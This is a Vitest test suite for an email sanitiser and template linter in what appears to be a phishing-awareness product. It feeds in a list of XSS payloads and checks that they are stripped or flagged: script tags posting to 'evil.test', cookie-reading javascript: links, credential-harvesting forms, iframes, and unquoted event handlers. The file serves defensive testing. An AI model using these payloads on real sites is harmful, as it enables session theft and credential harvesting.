import { describe, expect, it } from 'vitest';
import { LintStatus } from '@chetna/core';
import { runLint, sanitizeEmailHtml } from '@chetna/safety-lint';
import { TEMPLATE_META } from './_fixture';

/**
 * A25–A26 · the replay path cannot execute operator-injected script.
 *
 * Context: a template is authored by a SECURITY_ADMIN, so a compromised or
 * malicious console account is a real threat model. The authoring linter is a
 * DENYLIST and denylists leak — SL005 originally looked for
 * `on[a-z]+="..."` and would have missed `onload=alert(1)` with no quotes.
 *
 * So the teachable moment renders through an ALLOWLIST sanitiser, and the
 * nonce-based CSP blocks un-nonced inline script even if both were defeated.
 * These tests attack all three layers.
 */

describe('A25 · the allowlist sanitiser strips every scripting vector', () => {
  const attacks: { label: string; html: string; mustNotContain: string[] }[] = [
    {
      label: 'script element',
      html: '<p>hi</p><script>fetch("https://evil.test",{method:"POST"})</script>',
      mustNotContain: ['<script', 'fetch('],
    },
    {
      label: 'unquoted event handler — the hole the regex had',
      html: '<img src="data:image/gif;base64,R0lGOD" onload=alert(1) alt="x" />',
      mustNotContain: ['onload'],
    },
    {
      label: 'quoted event handler',
      html: '<div onclick="steal()">click</div>',
      mustNotContain: ['onclick'],
    },
    {
      label: 'mixed-case event handler',
      html: '<div OnMouseOver="steal()">hover</div>',
      mustNotContain: ['OnMouseOver', 'onmouseover'],
    },
    {
      label: 'javascript: href',
      html: '<a href="javascript:alert(document.cookie)">continue</a>',
      mustNotContain: ['javascript:'],
    },
    {
      label: 'iframe',
      html: '<iframe src="https://evil.test/harvest"></iframe>',
      mustNotContain: ['<iframe', 'evil.test'],
    },
    {
      label: 'svg with embedded script',
      html: '<svg><script>alert(1)</script></svg>',
      mustNotContain: ['<svg', '<script'],
    },
    {
      label: 'form that could submit',
      html: '<form action="https://evil.test/collect" method="post"><input name="pw" /></form>',
      mustNotContain: ['<form', '<input', 'evil.test'],
    },
    {
      label: 'object and embed',
      html: '<object data="x.swf"></object><embed src="y.swf" />',
      mustNotContain: ['<object', '<embed'],
    },
    {
      label: 'css expression and javascript url in style',
      html: '<div style="width:expression(alert(1));background:url(javascript:alert(2))">x</div>',
      mustNotContain: ['expression(', 'javascript:'],
    },
    {
      label: 'meta refresh redirect',
      html: '<meta http-equiv="refresh" content="0;url=https://evil.test" />',
      mustNotContain: ['<meta', 'evil.test'],
    },
    {
      label: 'base tag hijacking relative urls',
      html: '<base href="https://evil.test/" /><a href="/login">go</a>',
      mustNotContain: ['<base', 'evil.test'],
    },
  ];

  for (const attack of attacks) {
    it(`strips: ${attack.label}`, () => {
      const out = sanitizeEmailHtml(attack.html).html;
      for (const forbidden of attack.mustNotContain) {
        expect(out, `"${forbidden}" survived sanitisation`).not.toContain(forbidden);
      }
    });
  }

  it('reports what it removed, so a silent strip cannot hide a problem', () => {
    const result = sanitizeEmailHtml('<div onclick="x()"><script>y()</script><p>text</p></div>');
    expect(result.removed.tags).toContain('script');
    expect(result.removed.attributes).toContain('div@onclick');
  });

  it('preserves the legitimate structure and styling of an email', () => {
    const html =
      '<table style="width:100%"><tr><td align="center">' +
      '<img src="data:image/png;base64,iVBOR" alt="logo" width="120" />' +
      '<p style="color:#222">Hello <strong>Priya</strong></p>' +
      '<a href="https://portal.nimbus.test/x">Review</a>' +
      '</td></tr></table>';
    const out = sanitizeEmailHtml(html).html;
    expect(out).toContain('<table');
    expect(out).toContain('style="width:100%"');
    expect(out).toContain('alt="logo"');
    expect(out).toContain('<strong>Priya</strong>');
    expect(out).toContain('href="https://portal.nimbus.test/x"');
  });

  it('keeps the cue annotation marks the overlay depends on', () => {
    const out = sanitizeEmailHtml(
      '<p>act <mark class="chetna-cue" data-cue-id="LANG_URGENCY" tabindex="0">immediately</mark></p>',
    ).html;
    expect(out).toContain('data-cue-id="LANG_URGENCY"');
    expect(out).toContain('class="chetna-cue"');
  });
});

describe('A26 · the authoring linter catches the handler forms it used to miss', () => {
  const lint = (html: string) => runLint(html, TEMPLATE_META);

  it('rejects an unquoted inline event handler', () => {
    const r = lint('<p>x</p><img src="{{pixelUrl}}" onload=alert(1) /><a href="{{reportUrl}}">r</a>{{watermark}}');
    expect(r.status).toBe(LintStatus.FAIL);
    expect(r.findings.map((f) => f.ruleId)).toContain('SL005_NO_SCRIPT');
  });

  it('rejects a mixed-case handler', () => {
    const r = lint('<div OnMouseOver="x()">y</div><a href="{{reportUrl}}">r</a>{{watermark}}');
    expect(r.findings.map((f) => f.ruleId)).toContain('SL005_NO_SCRIPT');
  });

  it('names the attribute and the element, so the author can find it', () => {
    const r = lint('<div onfocus=x()>y</div><a href="{{reportUrl}}">r</a>{{watermark}}');
    const finding = r.findings.find((f) => f.ruleId === 'SL005_NO_SCRIPT');
    expect(finding?.message).toMatch(/onfocus/i);
    expect(finding?.message).toMatch(/div/i);
  });
});
